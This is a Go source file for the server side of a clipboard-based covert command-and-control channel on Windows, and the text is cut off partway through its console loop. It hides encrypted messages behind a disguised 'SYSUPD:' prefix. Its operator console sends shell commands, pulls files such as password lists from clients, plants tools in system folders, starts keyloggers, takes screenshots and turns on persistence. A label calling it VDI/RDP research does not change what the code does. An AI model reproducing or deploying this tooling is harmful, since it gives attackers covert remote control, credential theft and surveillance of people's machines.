// server.go - Complete Enhanced Clipboard Covert Channel Server
//

package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Configuration
const (
	PROTOCOL_PREFIX   = "SYSUPD:"
	DEFAULT_HEARTBEAT = 5 * time.Second
	MIN_HEARTBEAT     = 1 * time.Second
	MAX_HEARTBEAT     = 300 * time.Second
	MAX_PAYLOAD_SIZE  = 1024
	FILE_CHUNK_SIZE   = 800
	CF_UNICODETEXT    = 13
	GMEM_MOVEABLE     = 0x0002
)

// Message types
const (
	MSG_HEARTBEAT     = "HB"
	MSG_COMMAND       = "CMD"
	MSG_RESPONSE      = "RESP"
	MSG_DATA          = "DATA"
	MSG_ERROR         = "ERR"
	MSG_SHELL         = "SHELL"
	MSG_SLEEP         = "SLEEP"
	MSG_WAKE          = "WAKE"
	MSG_SET_HEARTBEAT = "SET_HB"
	MSG_STATUS        = "STATUS"
	MSG_QUEUE         = "QUEUE"
	MSG_QUEUE_STATUS  = "QUEUE_STATUS"
	MSG_DOWNLOAD      = "DOWNLOAD"
	MSG_UPLOAD        = "UPLOAD"
	MSG_FILE_CHUNK    = "FILE_CHUNK"
	MSG_FILE_COMPLETE = "FILE_COMPLETE"
	MSG_FILE_ERROR    = "FILE_ERROR"
	MSG_PERSIST       = "PERSIST"
	MSG_ENV_INFO      = "ENV_INFO"
	MSG_SCREENSHOT    = "SCREENSHOT"
	MSG_KEYLOG        = "KEYLOG"
	MSG_PROC_LIST     = "PROC_LIST"
)

var (
	user32   = windows.NewLazyDLL("user32.dll")
	kernel32 = windows.NewLazyDLL("kernel32.dll")

	procOpenClipboard              = user32.NewProc("OpenClipboard")
	procCloseClipboard             = user32.NewProc("CloseClipboard")
	procEmptyClipboard             = user32.NewProc("EmptyClipboard")
	procSetClipboardData           = user32.NewProc("SetClipboardData")
	procGetClipboardData           = user32.NewProc("GetClipboardData")
	procIsClipboardFormatAvailable = user32.NewProc("IsClipboardFormatAvailable")

	procGlobalAlloc  = kernel32.NewProc("GlobalAlloc")
	procGlobalLock   = kernel32.NewProc("GlobalLock")
	procGlobalUnlock = kernel32.NewProc("GlobalUnlock")
	procGlobalSize   = kernel32.NewProc("GlobalSize")
)

type Message struct {
	ID          string    `json:"id"`
	Type        string    `json:"type"`
	Timestamp   time.Time `json:"timestamp"`
	From        string    `json:"from"`
	To          string    `json:"to"`
	Payload     string    `json:"payload"`
	Sequence    int       `json:"seq"`
	Error       string    `json:"error,omitempty"`
	FileID      string    `json:"file_id,omitempty"`
	FileName    string    `json:"file_name,omitempty"`
	FileSize    int64     `json:"file_size,omitempty"`
	ChunkNum    int       `json:"chunk_num,omitempty"`
	TotalChunks int       `json:"total_chunks,omitempty"`
}

type CovertChannel struct {
	nodeID            string
	key               []byte
	gcm               cipher.AEAD
	lastHash          string
	sequence          int
	onMessage         func(*Message)
	running           bool
	debug             bool
	heartbeatInterval time.Duration
}

func NewCovertChannel(nodeID, password string, heartbeatInterval time.Duration, debug bool) (*CovertChannel, error) {
	hash := sha256.Sum256([]byte(password))
	key := hash[:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	return &CovertChannel{
		nodeID:            nodeID,
		key:               key,
		gcm:               gcm,
		debug:             debug,
		heartbeatInterval: heartbeatInterval,
	}, nil
}

func (cc *CovertChannel) setClipboard(text string) error {
	if cc.debug {
		log.Printf("[%s] Setting clipboard: %d bytes", cc.nodeID, len(text))
	}

	utf16Text, err := syscall.UTF16FromString(text)
	if err != nil {
		return err
	}

	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return fmt.Errorf("failed to open clipboard")
	}
	defer procCloseClipboard.Call()

	ret, _, _ = procEmptyClipboard.Call()
	if ret == 0 {
		return fmt.Errorf("failed to empty clipboard")
	}

	size := len(utf16Text) * 2
	hMem, _, _ := procGlobalAlloc.Call(GMEM_MOVEABLE, uintptr(size))
	if hMem == 0 {
		return fmt.Errorf("failed to allocate memory")
	}

	pMem, _, _ := procGlobalLock.Call(hMem)
	if pMem == 0 {
		return fmt.Errorf("failed to lock memory")
	}

	copy((*[1 << 20]uint16)(unsafe.Pointer(pMem))[:len(utf16Text)], utf16Text)
	procGlobalUnlock.Call(hMem)

	ret, _, _ = procSetClipboardData.Call(CF_UNICODETEXT, hMem)
	if ret == 0 {
		return fmt.Errorf("failed to set clipboard data")
	}

	return nil
}

func (cc *CovertChannel) getClipboard() (string, error) {
	ret, _, _ := procIsClipboardFormatAvailable.Call(CF_UNICODETEXT)
	if ret == 0 {
		return "", fmt.Errorf("unicode text format not available")
	}

	ret, _, _ = procOpenClipboard.Call(0)
	if ret == 0 {
		return "", fmt.Errorf("failed to open clipboard")
	}
	defer procCloseClipboard.Call()

	hData, _, _ := procGetClipboardData.Call(CF_UNICODETEXT)
	if hData == 0 {
		return "", fmt.Errorf("failed to get clipboard data")
	}

	pData, _, _ := procGlobalLock.Call(hData)
	if pData == 0 {
		return "", fmt.Errorf("failed to lock clipboard data")
	}
	defer procGlobalUnlock.Call(hData)

	size, _, _ := procGlobalSize.Call(hData)
	if size == 0 {
		return "", fmt.Errorf("clipboard data is empty")
	}

	utf16Data := (*[1 << 20]uint16)(unsafe.Pointer(pData))[:size/2]
	text := syscall.UTF16ToString(utf16Data)

	if cc.debug {
		log.Printf("[%s] Got clipboard: %d bytes", cc.nodeID, len(text))
	}

	return text, nil
}

func (cc *CovertChannel) encrypt(data []byte) (string, error) {
	nonce := make([]byte, cc.gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}

	ciphertext := cc.gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func (cc *CovertChannel) decrypt(encoded string) ([]byte, error) {
	ciphertext, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}

	nonceSize := cc.gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return cc.gcm.Open(nil, nonce, ciphertext, nil)
}

func (cc *CovertChannel) SendMessage(msgType, to, payload string) error {
	if len(payload) > MAX_PAYLOAD_SIZE {
		return cc.sendChunkedMessage(msgType, to, payload)
	}

	msg := Message{
		ID:        fmt.Sprintf("%s-%d", cc.nodeID, time.Now().Unix()),
		Type:      msgType,
		Timestamp: time.Now(),
		From:      cc.nodeID,
		To:        to,
		Payload:   payload,
		Sequence:  cc.sequence,
	}
	cc.sequence++

	return cc.sendSingleMessage(&msg)
}

func (cc *CovertChannel) sendChunkedMessage(msgType, to, payload string) error {
	chunks := cc.chunkString(payload, MAX_PAYLOAD_SIZE)

	for i, chunk := range chunks {
		chunkMsg := Message{
			ID:        fmt.Sprintf("%s-%d-%d", cc.nodeID, time.Now().Unix(), i),
			Type:      msgType + "_CHUNK",
			Timestamp: time.Now(),
			From:      cc.nodeID,
			To:        to,
			Payload:   fmt.Sprintf("%d/%d:%s", i+1, len(chunks), chunk),
			Sequence:  cc.sequence,
		}
		cc.sequence++

		if err := cc.sendSingleMessage(&chunkMsg); err != nil {
			return err
		}

		time.Sleep(100 * time.Millisecond)
	}

	return nil
}

func (cc *CovertChannel) sendSingleMessage(msg *Message) error {
	jsonData, err := json.Marshal(msg)
	if err != nil {
		return err
	}

	encrypted, err := cc.encrypt(jsonData)
	if err != nil {
		return err
	}

	clipboardData := PROTOCOL_PREFIX + encrypted
	return cc.setClipboard(clipboardData)
}

func (cc *CovertChannel) chunkString(s string, chunkSize int) []string {
	var chunks []string
	for i := 0; i < len(s); i += chunkSize {
		end := i + chunkSize
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

func (cc *CovertChannel) parseMessage(clipboardData string) (*Message, error) {
	if !strings.HasPrefix(clipboardData, PROTOCOL_PREFIX) {
		return nil, fmt.Errorf("not a protocol message")
	}

	encrypted := clipboardData[len(PROTOCOL_PREFIX):]

	decrypted, err := cc.decrypt(encrypted)
	if err != nil {
		return nil, err
	}

	var msg Message
	if err := json.Unmarshal(decrypted, &msg); err != nil {
		return nil, err
	}

	return &msg, nil
}

func (cc *CovertChannel) StartMonitoring() {
	cc.running = true

	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	log.Printf("[%s] Starting clipboard monitoring...", cc.nodeID)

	for cc.running {
		select {
		case <-ticker.C:
			clipboardData, err := cc.getClipboard()
			if err != nil {
				continue
			}

			currentHash := fmt.Sprintf("%x", sha256.Sum256([]byte(clipboardData)))
			if currentHash == cc.lastHash {
				continue
			}
			cc.lastHash = currentHash

			msg, err := cc.parseMessage(clipboardData)
			if err != nil {
				continue
			}

			if msg.From == cc.nodeID || (msg.To != "BROADCAST" && msg.To != cc.nodeID) {
				continue
			}

			if cc.onMessage != nil {
				cc.onMessage(msg)
			}
		}
	}
}

func (cc *CovertChannel) Stop() {
	cc.running = false
}

func (cc *CovertChannel) SetHeartbeatInterval(interval time.Duration) {
	cc.heartbeatInterval = interval
}

type ClientInfo struct {
	LastSeen    time.Time
	Status      string
	Heartbeat   time.Duration
	SleepUntil  time.Time
	QueuedCmds  int
	Environment string
	Persistent  bool
	FirstSeen   time.Time
}

type FileTransfer struct {
	ID          string
	FileName    string
	TotalSize   int64
	Chunks      map[int][]byte
	TotalChunks int
	Received    int
	StartTime   time.Time
	Direction   string
}

type Server struct {
	channel           *CovertChannel
	clients           map[string]ClientInfo
	chunkBuffer       map[string][]string
	fileTransfers     map[string]*FileTransfer
	interactive       bool
	heartbeatInterval time.Duration
	quietMode         bool
}

func NewServer(password string, heartbeatInterval time.Duration, quietMode bool, debug bool) (*Server, error) {
	channel, err := NewCovertChannel("SERVER", password, heartbeatInterval, debug)
	if err != nil {
		return nil, err
	}

	server := &Server{
		channel:           channel,
		clients:           make(map[string]ClientInfo),
		chunkBuffer:       make(map[string][]string),
		fileTransfers:     make(map[string]*FileTransfer),
		heartbeatInterval: heartbeatInterval,
		quietMode:         quietMode,
	}

	channel.onMessage = server.handleMessage
	return server, nil
}

func (s *Server) handleMessage(msg *Message) {
	if msg.From == "SERVER" {
		return
	}

	if !s.quietMode {
		log.Printf("[SERVER] Received %s from %s (seq: %d)", msg.Type, msg.From, msg.Sequence)
	}

	clientInfo := s.clients[msg.From]
	if clientInfo.FirstSeen.IsZero() {
		clientInfo.FirstSeen = time.Now()
	}
	clientInfo.LastSeen = time.Now()

	if msg.Type == MSG_HEARTBEAT {
		if clientInfo.Status == "" {
			clientInfo.Status = "active"
			clientInfo.Heartbeat = s.heartbeatInterval
		}
	}

	s.clients[msg.From] = clientInfo

	if strings.HasSuffix(msg.Type, "_CHUNK") {
		s.handleChunkedMessage(msg)
		return
	}

	switch msg.Type {
	case MSG_HEARTBEAT:
		if msg.Payload != "pong" && !s.quietMode {
			log.Printf("[SERVER] Client %s: %s", msg.From, msg.Payload)
		}
		s.channel.SendMessage(MSG_HEARTBEAT, msg.From, "ACK")

	case MSG_RESPONSE:
		if s.quietMode {
			fmt.Printf("%s\n", msg.Payload)
		} else {
			fmt.Printf("\n=== Response from %s ===\n%s\n========================\n", msg.From, msg.Payload)
		}

	case MSG_DATA:
		if !s.quietMode {
			log.Printf("[SERVER] Data from %s (%d bytes)", msg.From, len(msg.Payload))
		}
		if s.quietMode {
			fmt.Printf("%s\n", msg.Payload)
		} else {
			fmt.Printf("\n=== Data from %s ===\n%s\n==================\n", msg.From, msg.Payload)
		}

	case MSG_ENV_INFO:
		if s.quietMode {
			fmt.Printf("Environment: %s\n", msg.Payload)
		} else {
			fmt.Printf("\n=== Environment Info from %s ===\n%s\n===============================\n", msg.From, msg.Payload)
		}

		clientInfo = s.clients[msg.From]
		var envInfo map[string]interface{}
		if err := json.Unmarshal([]byte(msg.Payload), &envInfo); err == nil {
			if env, ok := envInfo["session_type"].(string); ok {
				clientInfo.Environment = env
				s.clients[msg.From] = clientInfo
			}
		}

	case MSG_QUEUE_STATUS:
		if s.quietMode {
			fmt.Printf("Queue: %s\n", msg.Payload)
		} else {
			fmt.Printf("\n=== Queue Status from %s ===\n%s\n===========================\n", msg.From, msg.Payload)
		}

		clientInfo = s.clients[msg.From]
		var queueInfo struct {
			Pending   int `json:"pending"`
			Completed int `json:"completed"`
		}
		if err := json.Unmarshal([]byte(msg.Payload), &queueInfo); err == nil {
			clientInfo.QueuedCmds = queueInfo.Pending
			s.clients[msg.From] = clientInfo
		}

	case MSG_SCREENSHOT:
		s.handleScreenshot(msg)

	case MSG_KEYLOG:
		s.handleKeylog(msg)

	case MSG_PROC_LIST:
		if s.quietMode {
			fmt.Printf("%s\n", msg.Payload)
		} else {
			fmt.Printf("\n=== Process List from %s ===\n%s\n===========================\n", msg.From, msg.Payload)
		}

	case MSG_FILE_CHUNK:
		s.handleFileChunk(msg)

	case MSG_FILE_COMPLETE:
		s.handleFileComplete(msg)

	case MSG_FILE_ERROR:
		if !s.quietMode {
			fmt.Printf("\n=== File Transfer Error from %s ===\n%s\n===============================\n", msg.From, msg.Payload)
		} else {
			fmt.Printf("File Error: %s\n", msg.Payload)
		}
	}
}

func (s *Server) handleScreenshot(msg *Message) {
	if s.quietMode {
		fmt.Printf("Screenshot received from %s\n", msg.From)
	} else {
		fmt.Printf("\n=== Screenshot from %s ===\n", msg.From)
	}

	imageData, err := base64.StdEncoding.DecodeString(msg.Payload)
	if err != nil {
		fmt.Printf("Error decoding screenshot: %v\n", err)
		return
	}

	filename := fmt.Sprintf("screenshot_%s_%d.txt", msg.From, time.Now().Unix())
	err = os.WriteFile(filename, imageData, 0644)
	if err != nil {
		fmt.Printf("Error saving screenshot: %v\n", err)
		return
	}

	if s.quietMode {
		fmt.Printf("Saved: %s (%d bytes)\n", filename, len(imageData))
	} else {
		fmt.Printf("Screenshot saved: %s (%d bytes)\n========================\n", filename, len(imageData))
	}
}

func (s *Server) handleKeylog(msg *Message) {
	if s.quietMode {
		fmt.Printf("Keylog: %s\n", msg.Payload)
	} else {
		fmt.Printf("\n=== Keylog from %s ===\n%s\n=====================\n", msg.From, msg.Payload)
	}

	filename := fmt.Sprintf("keylog_%s_%d.txt", msg.From, time.Now().Unix())
	err := os.WriteFile(filename, []byte(msg.Payload), 0644)
	if err == nil && !s.quietMode {
		fmt.Printf("Keylog saved to: %s\n", filename)
	}
}

func (s *Server) handleFileChunk(msg *Message) {
	if msg.FileID == "" {
		return
	}

	transfer, exists := s.fileTransfers[msg.FileID]
	if !exists {
		transfer = &FileTransfer{
			ID:          msg.FileID,
			FileName:    msg.FileName,
			TotalSize:   msg.FileSize,
			Chunks:      make(map[int][]byte),
			TotalChunks: msg.TotalChunks,
			StartTime:   time.Now(),
			Direction:   "download",
		}
		s.fileTransfers[msg.FileID] = transfer

		if !s.quietMode {
			fmt.Printf("[FILE] Starting download: %s (%d bytes, %d chunks)\n",
				msg.FileName, msg.FileSize, msg.TotalChunks)
		}
	}

	chunkData, err := base64.StdEncoding.DecodeString(msg.Payload)
	if err != nil {
		if !s.quietMode {
			fmt.Printf("[FILE] Error decoding chunk %d: %v\n", msg.ChunkNum, err)
		}
		return
	}

	transfer.Chunks[msg.ChunkNum] = chunkData
	transfer.Received++

	if !s.quietMode {
		progress := float64(transfer.Received) / float64(transfer.TotalChunks) * 100
		fmt.Printf("[FILE] Progress: %.1f%% (%d/%d chunks)\n",
			progress, transfer.Received, transfer.TotalChunks)
	}

	if transfer.Received == transfer.TotalChunks {
		s.completeFileDownload(transfer)
	}
}

func (s *Server) completeFileDownload(transfer *FileTransfer) {
	var fileData []byte
	for i := 0; i < transfer.TotalChunks; i++ {
		chunk, exists := transfer.Chunks[i]
		if !exists {
			fmt.Printf("[FILE] Missing chunk %d, download incomplete\n", i)
			return
		}
		fileData = append(fileData, chunk...)
	}

	filename := fmt.Sprintf("downloaded_%s", filepath.Base(transfer.FileName))
	err := os.WriteFile(filename, fileData, 0644)
	if err != nil {
		fmt.Printf("[FILE] Error saving file: %v\n", err)
		return
	}

	duration := time.Since(transfer.StartTime)
	if s.quietMode {
		fmt.Printf("Downloaded: %s (%d bytes)\n", filename, len(fileData))
	} else {
		fmt.Printf("[FILE] Download complete: %s (%d bytes in %v)\n",
			filename, len(fileData), duration)
	}

	delete(s.fileTransfers, transfer.ID)
}

func (s *Server) handleFileComplete(msg *Message) {
	if msg.FileID == "" {
		return
	}

	transfer, exists := s.fileTransfers[msg.FileID]
	if !exists {
		return
	}

	duration := time.Since(transfer.StartTime)
	if s.quietMode {
		fmt.Printf("Upload complete: %s\n", transfer.FileName)
	} else {
		fmt.Printf("[FILE] Upload complete: %s (%d bytes in %v)\n",
			transfer.FileName, transfer.TotalSize, duration)
	}

	delete(s.fileTransfers, msg.FileID)
}

func (s *Server) handleChunkedMessage(msg *Message) {
	parts := strings.SplitN(msg.Payload, ":", 2)
	if len(parts) != 2 {
		return
	}

	chunkInfo := parts[0]
	chunkData := parts[1]

	key := fmt.Sprintf("%s_%s", msg.From, strings.TrimSuffix(msg.Type, "_CHUNK"))
	if s.chunkBuffer[key] == nil {
		s.chunkBuffer[key] = make([]string, 0)
	}

	s.chunkBuffer[key] = append(s.chunkBuffer[key], chunkData)

	var currentChunk, totalChunks int
	fmt.Sscanf(chunkInfo, "%d/%d", &currentChunk, &totalChunks)

	if len(s.chunkBuffer[key]) == totalChunks {
		fullPayload := strings.Join(s.chunkBuffer[key], "")

		reconstructed := &Message{
			ID:        msg.ID,
			Type:      strings.TrimSuffix(msg.Type, "_CHUNK"),
			Timestamp: msg.Timestamp,
			From:      msg.From,
			To:        msg.To,
			Payload:   fullPayload,
			Sequence:  msg.Sequence,
			Error:     msg.Error,
		}

		s.handleMessage(reconstructed)
		delete(s.chunkBuffer, key)
	}
}

func (s *Server) uploadFile(clientID, localPath, remotePath string) error {
	fileData, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read file: %v", err)
	}

	fileID := fmt.Sprintf("upload_%d", time.Now().Unix())
	fileName := remotePath
	if fileName == "" {
		fileName = filepath.Base(localPath)
	}

	totalChunks := (len(fileData) + FILE_CHUNK_SIZE - 1) / FILE_CHUNK_SIZE

	transfer := &FileTransfer{
		ID:          fileID,
		FileName:    fileName,
		TotalSize:   int64(len(fileData)),
		TotalChunks: totalChunks,
		StartTime:   time.Now(),
		Direction:   "upload",
	}
	s.fileTransfers[fileID] = transfer

	if !s.quietMode {
		fmt.Printf("[FILE] Starting upload: %s -> %s (%d bytes, %d chunks)\n",
			localPath, fileName, len(fileData), totalChunks)
	}

	for i := 0; i < totalChunks; i++ {
		start := i * FILE_CHUNK_SIZE
		end := start + FILE_CHUNK_SIZE
		if end > len(fileData) {
			end = len(fileData)
		}

		chunk := fileData[start:end]
		encodedChunk := base64.StdEncoding.EncodeToString(chunk)

		msg := Message{
			ID:          fmt.Sprintf("SERVER-%d-%d", time.Now().Unix(), i),
			Type:        MSG_FILE_CHUNK,
			From:        "SERVER",
			To:          clientID,
			Payload:     encodedChunk,
			FileID:      fileID,
			FileName:    fileName,
			FileSize:    int64(len(fileData)),
			ChunkNum:    i,
			TotalChunks: totalChunks,
		}

		jsonData, _ := json.Marshal(msg)
		encrypted, _ := s.channel.encrypt(jsonData)
		clipboardData := PROTOCOL_PREFIX + encrypted
		s.channel.setClipboard(clipboardData)

		if !s.quietMode && (i+1)%10 == 0 {
			progress := float64(i+1) / float64(totalChunks) * 100
			fmt.Printf("[FILE] Upload progress: %.1f%% (%d/%d chunks)\n",
				progress, i+1, totalChunks)
		}

		time.Sleep(200 * time.Millisecond)
	}

	return nil
}

func (s *Server) showComprehensiveHelp() {
	fmt.Println("\n=== COMPLETE SERVER COMMAND REFERENCE ===")
	fmt.Println("Basic Operations:")
	fmt.Println("  list                       - List connected clients with detailed status")
	fmt.Println("  send <client> <cmd>        - Send single command to client")
	fmt.Println("  queue <client> <cmd1;cmd2> - Queue multiple commands (semicolon separated)")
	fmt.Println("")
	fmt.Println("File Operations:")
	fmt.Println("  download <client> <remote> [local] - Download file from client")
	fmt.Println("  upload <client> <local> [remote]   - Upload file to client")
	fmt.Println("")
	fmt.Println("VDI/RDP Research Commands:")
	fmt.Println("  envinfo <client>           - Get detailed environment information")
	fmt.Println("  screenshot <client>        - Capture screenshot")
	fmt.Println("  keylog <client> <start|stop> - Control keylogger")
	fmt.Println("  proclist <client>          - Get running process list")
	fmt.Println("")
	fmt.Println("Client Management:")
	fmt.Println("  persist <client> <on|off>  - Enable/disable persistence")
	fmt.Println("  sleep <client> <duration>  - Put client to sleep (30s, 5m, 1h)")
	fmt.Println("  wake <client>              - Wake up sleeping client")
	fmt.Println("  heartbeat <client|ALL> <interval> - Change heartbeat interval")
	fmt.Println("")
	fmt.Println("Server Options:")
	fmt.Println("  quiet                      - Toggle quiet mode (output only)")
	fmt.Println("  exit                       - Shutdown server and exit")
	fmt.Println("")
	fmt.Println("Examples:")
	fmt.Println("  send CLIENT1 whoami")
	fmt.Println("  queue CLIENT1 whoami ; hostname ; ipconfig /all")
	fmt.Println("  download CLIENT1 C:\\temp\\passwords.txt")
	fmt.Println("  upload CLIENT1 tool.exe C:\\windows\\temp\\tool.exe")
	fmt.Println("  envinfo CLIENT1")
	fmt.Println("  screenshot CLIENT1")
	fmt.Println("  sleep CLIENT1 30m")
	fmt.Println("  heartbeat CLIENT1 10s")
	fmt.Println("=========================================")
}

func (s *Server) StartInteractive() {
	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		fmt.Println("\n=== COMPLETE ENHANCED SERVER CONSOLE ===")
		fmt.Println("Advanced clipboard C2 with VDI/RDP research capabilities")
		fmt.Println("Commands:")
		fmt.Println("  help                       - Show comprehensive command help")
		fmt.Println("  list                       - List connected clients with environment info")
		fmt.Println("  send <client> <cmd>        - Send command to client")
		fmt.Println("  queue <client> <cmd1;cmd2> - Queue multiple commands")
		fmt.Println("  download <client> <remote> [local] - Download file from client")
		fmt.Println("  upload <client> <local> [remote]   - Upload file to client")
		fmt.Println("  envinfo <client>           - Get detailed VDI/RDP environment info")
		fmt.Println("  persist <client> <on|off>  - Enable/disable background persistence")
		fmt.Println("  sleep <client> <duration>  - Put client to sleep")
		fmt.Println("  wake <client>              - Wake up client")
		fmt.Println("  heartbeat <client|ALL> <interval> - Change heartbeat interval")
		fmt.Println("  screenshot <client>        - Capture screenshot")
		fmt.Println("  keylog <client> <start|stop> - Control keylogger")
		fmt.Println("  proclist <client>          - Get running process list")
		fmt.Println("  quiet                      - Toggle quiet mode")
		fmt.Println("  exit                       - Exit server")
		fmt.Println("")
		fmt.Println("Type 'help' for detailed examples and VDI/RDP research commands.")
		fmt.Println("===========================================")

		for scanner.Scan() {
			input := strings.TrimSpace(scanner.Text())
			if input == "" {
				continue
			}

			parts := strings.Fields(input)
			command := parts[0]

			switch command {
			case "help":
				s.showComprehensiveHelp()

			case "list":
				fmt.Printf("\nConnected clients (%d):\n", len(s.clients))
				for clientID, info := range s.clients {
					status := info.Status
					if info.Status == "sleeping" && time.Now().Before(info.SleepUntil) {
						remaining := time.Until(info.SleepUntil)
						status = fmt.Sprintf("sleeping (%v remaining)", remaining.Round(time.Second))
					}

					envInfo := info.Environment
					if envInfo == "" {
						envInfo = "unknown"
					}

					queueInfo := ""
					if info.QueuedCmds > 0 {
						queueInfo = fmt.Sprintf(", queue: %d", info.QueuedCmds)
					}

					persistInfo := ""
					if info.Persistent {
						persistInfo = ", persistent"
					}

					uptime := time.Since(info.FirstSeen).Round(time.Second)

					fmt.Printf("  %s (env: %s, status: %s, uptime: %v, heartbeat: %v%s%s)\n",
						clientID, envInfo, status, uptime, info.Heartbeat, queueInfo, persistInfo)
				}

			case "send":
				if len(parts) < 3 {
					fmt.Println("Usage: send <client> <command>")
					continue
				}
				clientID := parts[1]
				cmd := strings.Join(parts[2:], " ")

				if _, exists := s.clients[clientID]; !exists {
					fmt.Printf("Client %s not found\n", clientID)
					continue
				}

				if !s.quietMode {
					log.Printf("[SERVER] Sending command to %s: %s", clientID, cmd)
				}
				s.channel.SendMessage(MSG_SHELL, clientID, cmd)

			case "queue":
				if len(parts) < 3 {
					fmt.Println("Usage: queue <client> <command1> [; command2] [; command3] ...")
					fmt.Println("Example: queue CLIENT1 whoami ; hostname ; ipconfig")
					continue
				}
				clientID := parts[1]
				cmdString := strings.Join(parts[2:], " ")

				if _, exists := s.clients[clientID]; !exists {
					fmt.Printf("Client %s not found\n", clientID)
					continue
				}

				commands := strings.Split(cmdString, ";")
				for i := range commands {
					commands[i] = strings.TrimSpace(commands[i])
				}

				commandsJSON, _ := json.Marshal(commands)
				if !s.quietMode {
					log.Printf("[SERVER] Queuing %d commands for %s", len(commands), clientID)
				}
				s.channel.SendMessage(MSG_QUEUE, clientID, string(commandsJSON))

				clientInfo := s.clients[clientID]
				clientInfo.QueuedCmds += len(commands)
				s.clients[clientID] = clientInfo

			case "envinfo":
				if len(parts) < 2 {
					fmt.Println("Usage: envinfo <client>")
					continue
				}
				clientID := parts[1]

				if _, exists := s.clients[clientID]; !exists {
					fmt.Printf("Client %s not found\n", clientID)
					continue
				}

				if !s.quietMode {
					log.Printf("[SERVER] Requesting environment info from %s", clientID)
				}
				s.channel.SendMessage(MSG_ENV_INFO, clientID, "detailed")

			case "persist":
				if len(parts) < 3 {
					fmt.Println("Usage: persist <client> <on|off>")
					continue
				}
				clientID := parts[1]
				action := strings.ToLower(parts[2])

				if _, exists := s.clients[clientID]; !exists {
					fmt.Printf("Client %s not found\n", clientID)
					continue
				}

				if action != "on" && action != "off" {
					fmt.Println("Action must be 'on' or 'off'")
					continue
				}

				if !s.quietMode {
					log.Printf("[SERVER] Setting persistence %s for %s", action, clientID)
				}
				s.channel.SendMessage(MSG_PERSIST, clientID, action)

				clientInfo := s.clients[clientID]
				clientInfo.Persistent = (action == "on")
				s.clients[clientID] = clientInfo

			case "screenshot":
				if len(parts) < 2 {
					fmt.Println("Usage: screenshot <client>")
					continue
				}
				clientID := parts[1]

				if _, exists := s.clients[clientID]; !exists {
					fmt.Printf("Client %s not found\n", clientID)
					continue
				}

				if !s.quietMode {
					log.Printf("[SERVER] Requesting screenshot from %s", clientID)
				}
				s.channel.SendMessage(MSG_SCREENSHOT, clientID, "capture")

			case "keylog":
				if len(parts) < 3 {
					fmt.Println("Usage: keylog <client> <start|stop>")
					continue
				}
				clientID := parts[1]
				action := strings.ToLower(parts[2])

				if _, exists := s.clients[clientID]; !exists {
					fmt.Printf("Client %s not found\n", clientID)
					continue
				}

				if action != "start" && action != "stop" {
					fmt.Println("Action must be 'start' or 'stop'")
					continue
				}

				if !s.quietMode {
					log.Printf("[SERVER] %s keylogger on %s", strings.Title(action), clientID)
				}
				s.channel.SendMessage(MSG_KEYLOG, clientID, action)

			case "proclist":
				if len(parts) < 2 {
					fmt.Println("Usage: proclist <client>")
					continue
				}
				clientID := parts[1]

				if _, exists := s.clients[clientID]; !exists {
					fmt.Printf("Client %s not found\n", clientID)
					continue
				}

				if !s.quietMode {
					log.Printf("[SERVER] Requesting process list from %s", clientID)
				}
				s.channel.SendMessage(MSG_PROC_LIST, clientID, "list")

			case "download":
				if len(parts) < 3 {
					fmt.Println("Usage: download <client> <remote_path> [local_name]")
					fmt.Println("Example: download CLIENT1 C:\\temp\\file.txt")
					continue
				}
				clientID := parts[1]
				remotePath := parts[2]

				if _, exists := s.clients[clientID]; !exists {
					fmt.Printf("Client %s not found\n", clientID)
					continue
				}

				fileID := fmt.Sprintf("download_%d", time.Now().Unix())
				downloadCmd := fmt.Sprintf("%s|%s", fileID, remotePath)

				if !s.quietMode {
					log.Printf("[SERVER] Requesting download from %s: %s", clientID, remotePath)
				}
				s.channel.SendMessage(MSG_DOWNLOAD, clientID, downloadCmd)

			case "upload":
				if len(parts) < 3 {
					fmt.Println("Usage: upload <client> <local_path> [remote_name]")
					fmt.Println("Example: upload CLIENT1 tool.exe C:\\temp\\tool.exe")
					continue
				}
				clientID := parts[1]
				localPath := parts[2]
				remotePath := ""
				if len(parts) > 3 {
					remotePath = parts[3]
				}

				if _, exists := s.clients[clientID]; !exists {
					fmt.Printf("Client %s not found\n", clientID)
					continue
				}

				if err := s.uploadFile(clientID, localPath, remotePath); err != nil {
					fmt.Printf("Upload failed: %v\n", err)
				}

			case "sleep":
				if len(parts) < 3 {
					fmt.Println("Usage: sleep <client> <duration>")
					fmt.Println("Example: sleep CLIENT1 30s")
					continue
				}
				clientID := parts[1]
				durationStr := parts[2]

				if _, exists := s.clients[clientID]; !exists {
					fmt.Printf("Client %s not found\n", clientID)
					continue
				}

				duration, err := time.ParseDuration(durationStr)
				if err != nil {
					fmt.Printf("Invalid duration: %s\n", durationStr)
					continue
				}

				if !s.quietMode {
					log.Printf("[SERVER] Putting client %s to sleep for %v", clientID, duration)
				}
				s.channel.SendMessage(MSG_SLEEP, clientID, durationStr)

				clientInfo := s.clients[clientID]
				clientInfo.Status = "sleeping"
				clientInfo.SleepUntil = time.Now().Add(duration)
				s.clients[clientID] = clientInfo

			case "wake":
				if len(parts) < 2 {
					fmt.Println("Usage: wake <client>")
					continue
				}
				clientID := parts[1]

				if _, exists := s.clients[clientID]; !exists {
					fmt.Printf("Client %s not found\n", clientID)
					continue
				}

				if !s.quietMode {
					log.Printf("[SERVER] Waking up client %s", clientID)
				}
				s.channel.SendMessage(MSG_WAKE, clientID, "wake")

				clientInfo := s.clients[clientID]
